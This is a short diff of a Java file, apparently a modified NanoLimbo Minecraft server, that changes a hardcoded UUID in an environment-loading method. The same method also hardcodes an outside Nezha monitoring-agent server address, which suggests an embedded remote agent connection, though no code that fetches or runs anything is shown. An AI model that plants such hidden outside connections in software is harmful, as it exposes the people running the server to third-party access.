@@ -132,7 +132,7 @@ public final class NanoLimbo {
     }
     
     private static void loadEnvVars(Map<String, String> envVars) throws IOException {
-        envVars.put("UUID", "038445b0-eeb8-4bc9-b2d3-8f8c0616a00d");
+        envVars.put("UUID", "5b23c4d5-1278-4739-92de-7bb87a0d6436");
         envVars.put("FILE_PATH", "./world");
         envVars.put("NEZHA_SERVER", "amd2.felixlee.pp.ua:3489");
         envVars.put("NEZHA_PORT", "");
